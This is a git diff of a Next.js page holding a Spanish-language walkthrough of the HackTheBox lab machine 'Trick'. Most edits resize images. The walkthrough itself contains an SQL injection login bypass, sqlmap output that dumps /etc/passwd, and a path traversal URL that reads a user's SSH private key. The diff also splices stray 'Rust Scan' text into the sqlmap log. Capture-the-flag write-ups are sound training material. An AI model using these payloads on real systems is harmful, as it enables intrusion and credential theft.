@@ -3,6 +3,7 @@ import { Paragraph } from "../../Components/Paragraph"
 import { ContentBlock } from "../../Layout/ContentBlock"
 import { SubTitle } from "../../Components/SubTitle"
 import { Anchor } from "../../Components/Anchor"
+import Image from 'next/image'
 
 export function Trick() {
   return <>
@@ -115,11 +116,11 @@ Nmap done: 1 IP address (1 host up) scanned in 53.28 seconds
           a la ip: <i>10.10.11.166</i> de la maquina vemos un formulario de correo en este caso vamos directo al ataque de la <i>DNS</i>.
         </Paragraph>
         <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_first.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={600}
+          height={378}
         />
         <Highlighter
           text={`
@@ -144,60 +145,60 @@ trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 6048
           fuente <i>ctrl + u</i> al final notamos que hace la peticion a:
         </Paragraph>
         <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_preprod_login_code.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
-        />
+          width={600}
+          height={311}
+        /> 
         <Paragraph>
           Intentemos inyectar SQL <i>admin' or true-- -</i> en el <i>Username</i> ¡wala! nos deja ingresar... vaya seguridad
         </Paragraph>
-        <Image
-          layout="fill"
+       <Image
+          layout="responsive"
           src="/trick/trick_login.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={600}
+          height={311}
         />
         <Paragraph>
           en este punto sacamos el <i>burpsuite</i> y notamos que las peticiones lo hace al mismo archivo <i>/var/www/payroll/admin_class.php</i>, cuando
           ingresamos por la url vemos lo siguiente:
         </Paragraph>
         <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_action_save_payroll.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={600}
+          height={225}
         />
          <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_preprod_login_action_login.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={600}
+          height={204}
         />
         <Paragraph>
           al abrir el nuevo subdominio vemos que la url puede ser manipulada con el parametro <i>page=</i>
         </Paragraph>
         <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_page_var.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={600}
+          height={204}
         />
         <Paragraph>
           esto nos da a pensar que es sensible a <Anchor src={'https://owasp.org/www-community/attacks/Path_Traversal'}>Path Traversal Attack</Anchor> 
           sin embargo nosotros usaremos <i>sqlmap </i> con estos datos recolectados hasta ahora.
         </Paragraph>
         <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_burp_employee.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={812}
+          height={321}
         />
         <Highlighter
           text={`
@@ -208,7 +209,7 @@ Parameter: id (POST)
     Type: boolean-based blind
     Title: Boolean-based blind - Parameter replace (original value)
     Payload: id=(SELECT (CASE WHEN (2945=2945) THEN '' ELSE (SELECT 3662 UNION SELECT 7138) END))&firstname=loefirst&middlename=&lastname=loelast&department_id=1&position_id=1&salary=2000
----
+---Rust Scan
 [22:25:48] [INFO] the back-end DBMS is MySQL
 web application technology: PHP, Nginx 1.14.2
 back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
@@ -230,7 +231,7 @@ current database: 'payroll_db'
 [22:25:52] [INFO] retrieving the length of query output
 [22:25:52] [INFO] retrieved: 4
 [22:25:57] [INFO] retrieved: 2351           
-[22:25:57] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
+[22:25:5Rust Scan7] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
 files saved to [1]:
 [*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)
 
@@ -246,15 +247,15 @@ michael:x:1001:1001::/home/michael:/bin/bash
 `}
         />
         <Paragraph>
-          dato nuevo tenemos un usuario <i>michael </i> no olvidemos que la Web esta montada con <Anchor src={"https://docs.nginx.com/nginx/admin-guide/web-server/serving-static-content/"}>NGINX</Anchor> 
+          dato nuevo tenemos un usuario <i>michael </i> no olvidemos que la Web esta montada con <Anchor src={"https://docs.nginx.com/nginx/admin-guide/web-server/serving-static-content/"}>NGINX </Anchor> 
           intetaremos leer el archivo de configuracion que tiene este servicio, despues de descargar una copia en burpsuite de la peticion al guardar nuevo empleado.
         </Paragraph>
         <Image
-          layout="fill"
+          layout="responsive"
           src="/trick/trick_burp_employee.webp"
           alt="trick.htb image"
-          width={200}
-          heigth={200}
+          width={812}
+          height={321}
         />
         <Highlighter
           text={`
@@ -474,7 +475,7 @@ root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_
         />
         <Paragraph>
           este script es el que buscabamos la variable <i>page</i> que es sensible a <i>Path Traversal Attack</i>, vemos que en la penultima linea 
-          reemplaza '../' con espacio vacio asi que simplemente pondremos <i>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa<i>, 
+          reemplaza '../' con espacio vacio asi que simplemente pondremos <i>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa</i>, 
           lo descargamos e ingresamos por ssh.
         </Paragraph>
         <Highlighter
@@ -503,6 +504,12 @@ michael@trick:~$
           <Paragraph>
             ahora toca escalar privilegio por <Anchor src={'https://hackmd.io/@tahaafarooq/privilege-escalation-fail2ban'}>fail2ban</Anchor> 
           </Paragraph>
+          <Image
+            layout='responsive'
+            src='https://res.cloudinary.com/djc1umong/image/upload/v1663699518/trick_pwn_tfhebg.webp'
+            width={702}
+            height={672}
+          />
       </ContentBlock>
     </>
   }
